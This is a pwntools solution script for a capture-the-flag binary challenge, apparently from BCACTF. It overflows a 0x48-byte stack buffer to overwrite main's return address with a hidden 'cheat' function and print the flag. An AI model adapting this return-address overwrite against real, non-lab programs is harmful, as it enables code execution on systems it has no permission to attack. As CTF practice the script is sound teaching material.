from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./adv-analysis')

e = ELF('./adv-analysis')

# read to the prompt
p.readuntil('> ')

'''
The stack is straight forward on this one
response        {Frame offset -0x48}
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
No leak for this one but it loads at a static address

You have to overwrite the return address of main() and set it to cheat
'''

print('[INFO] Cheat address 0x%x' %(e.symbols['cheat']))

response = b'i pledge to not cheat\x00'
response += b'a'*(0x48 - len(response))
response += struct.pack('Q', e.symbols['cheat'])  ## address of cheat
response += b'\n'

p.send(response)

p.readline()
p.readline()
p.readline()

flag = p.readline()

print('Flag: ', flag)

p.close()

